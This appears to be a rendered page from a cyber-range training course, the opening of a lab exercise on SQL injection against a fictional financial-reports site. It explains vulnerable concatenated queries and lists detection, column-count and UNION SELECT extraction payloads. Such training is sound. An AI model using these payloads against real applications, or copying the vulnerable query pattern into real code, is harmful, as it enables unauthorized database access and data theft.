@@ -1,0 +1,1512 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise CF2.3: SQL Injection - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-cf23-sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise CF2.3: SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-sql-injection-in-search-features" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: SQL Injection in Search Features
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: SQL Injection in Search Features">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-search-queries-become-vulnerable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How Search Queries Become Vulnerable
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-based-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UNION-Based Extraction
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-sql-injection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: SQL Injection Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-add-the-target-to-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Add the Target to /etc/hosts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-authenticate-and-access-the-reports-dashboard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Authenticate and Access the Reports Dashboard
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-test-a-normal-search" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Test a Normal Search
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-test-for-sql-injection-with-a-single-quote" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Test for SQL Injection with a Single Quote
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-confirm-injection-with-or-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Confirm Injection with OR Payloads
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-check-page-source-for-query-comments" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Check Page Source for Query Comments
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-8-enumerate-the-database-schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 8: Enumerate the Database Schema
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-9-determine-the-column-count-for-union" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 9: Determine the Column Count for UNION
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-10-extract-data-from-admin_secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 10: Extract Data from admin_secrets
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-cf23-sql-injection">Exercise CF2.3: SQL Injection</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>You should have completed Exercises CF2.1 (Login Bruteforce) and CF2.2 (Session Hijacking). Both exercises targeted authentication mechanisms from the outside. Exercise CF2.3 goes deeper: instead of guessing credentials or forging tokens, you will manipulate the database queries that power the application's search functionality. Your VPN must be connected and your terminal open before continuing.</p>
+<h2 id="scenario">Scenario</h2>
+<p>CapitalFlow Markets runs a financial reports system where authenticated users can search transaction history. Sarah Chen (CTO) flagged a concern: "The reports team built the search feature under a tight deadline. I heard they are concatenating user input directly into SQL queries. Test whether that is true, and if so, show me the worst-case impact."</p>
+<p>You will log in as a trader, locate the transaction search feature, confirm SQL injection is possible, enumerate the database schema, and extract sensitive data from a table named <code>admin_secrets</code>.</p>
+<p><strong>Target:</strong> capitalflow-reports.lab (port 80)</p>
+<p><strong>Credentials:</strong> trader@capitalflow.com / Trader2024#</p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Add the target hostname to <code>/etc/hosts</code> and authenticate as the trader</li>
+<li>Locate the transaction search feature and test for SQL injection</li>
+<li>Confirm injection by observing error messages or behavioral changes</li>
+<li>Enumerate the database schema to identify tables and columns</li>
+<li>Use UNION SELECT to extract data from the <code>admin_secrets</code> table</li>
+<li>Find and submit the flag in <code>OCR{...}</code> format</li>
+</ul>
+<hr />
+<h2 id="background-sql-injection-in-search-features">Background: SQL Injection in Search Features</h2>
+<h3 id="how-search-queries-become-vulnerable">How Search Queries Become Vulnerable</h3>
+<p>Web applications that search databases typically construct SQL queries by inserting user input into a query template. A secure implementation uses parameterized queries (also called prepared statements), where the database engine treats user input as data, never as SQL code. A vulnerable implementation concatenates user input directly into the query string, allowing an attacker to inject SQL syntax that alters the query's behavior.</p>
+<p><strong>Vulnerable search query (pseudocode):</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM transactions WHERE description LIKE &#39;%&quot;</span> <span class="o">+</span> <span class="n">user_input</span> <span class="o">+</span> <span class="s2">&quot;%&#39;&quot;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">result</span> <span class="o">=</span> <span class="n">database</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</code></pre></div>
+<p>When the user types <code>dividend</code>, the query becomes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">transactions</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%dividend%&#39;</span>
+</code></pre></div>
+<p>When the attacker types <code>' OR '1'='1</code>, the query becomes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">transactions</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1%&#39;</span>
+</code></pre></div>
+<p>The injected condition (<code>'1'='1'</code>) is always true, causing the query to return all rows instead of filtering by the search term.</p>
+<h3 id="union-based-extraction">UNION-Based Extraction</h3>
+<p>The UNION operator in SQL appends the results of a second SELECT query to the results of the first. For UNION to work, both queries must return the same number of columns. An attacker uses UNION SELECT to extract data from other tables in the database by appending a crafted query to the vulnerable one.</p>
+<pre class="mermaid"><code>graph TD
+    A["User searches&lt;br/&gt;'dividend'"] --&gt; B["Normal query executes&lt;br/&gt;returns matching rows"]
+    C["Attacker searches&lt;br/&gt;injection payload"] --&gt; D["Modified query executes&lt;br/&gt;returns all rows"]
+    D --&gt; E["Attacker adds&lt;br/&gt;UNION SELECT"]
+    E --&gt; F["Second query targets&lt;br/&gt;admin_secrets table"]
+    F --&gt; G["Sensitive data&lt;br/&gt;returned in results"]
+
+    style A fill:#4a90d9,color:#fff
+    style B fill:#6aaa64,color:#fff
+    style C fill:#d9534f,color:#fff
+    style G fill:#d9534f,color:#fff</code></pre>
+<h2 id="tool-primer-sql-injection-payloads">Tool Primer: SQL Injection Payloads</h2>
+<p>SQL injection testing follows a progression from detection to exploitation.</p>
+<p><strong>Detection payloads:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'</code></td>
+<td>Single quote; breaks string literals and triggers SQL errors</td>
+</tr>
+<tr>
+<td><code>' OR '1'='1</code></td>
+<td>Always-true condition; returns all rows if injectable</td>
+</tr>
+<tr>
+<td><code>' OR '1'='2</code></td>
+<td>Always-false condition; should return no rows (confirms boolean-based injection)</td>
+</tr>
+<tr>
+<td><code>'; --</code></td>
+<td>Terminates the statement and comments out the rest</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Column count discovery:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="s1">&#39; UNION SELECT NULL -- </span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="w"> </span><span class="c1">-- </span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="w"> </span><span class="c1">-- </span>
+</code></pre></div>
+<p>Increment the number of NULLs until the query executes without error. The number of NULLs that works equals the number of columns in the original query.</p>
+<p><strong>Data extraction:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="n">column2</span><span class="p">,</span><span class="n">column3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">target_table</span><span class="w"> </span><span class="c1">-- </span>
+</code></pre></div>
+<p>Replace <code>column1</code>, <code>column2</code>, etc. with actual column names from the target table.</p>
